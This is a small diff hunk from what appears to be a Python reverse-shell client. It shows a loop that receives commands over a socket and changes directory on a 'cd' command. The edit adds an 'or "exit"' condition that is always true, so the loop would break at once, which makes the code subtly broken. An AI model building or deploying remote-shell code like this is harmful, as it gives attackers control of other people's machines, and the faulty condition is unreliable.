@@ -13,7 +13,7 @@ s.send(str.encode("[*] Connection Established!")) # Send connection confirmation
 
 while 1: # Start loop.
     data = s.recv(1024).decode("UTF-8") # Recieve shell command.
-    if data == "quit": 
+    if data == "quit" or "exit": 
         break # If it's quit, then break out and close socket.
     if data[:2] == "cd":
         os.chdir(data[3:]) # If it's cd, change directory.
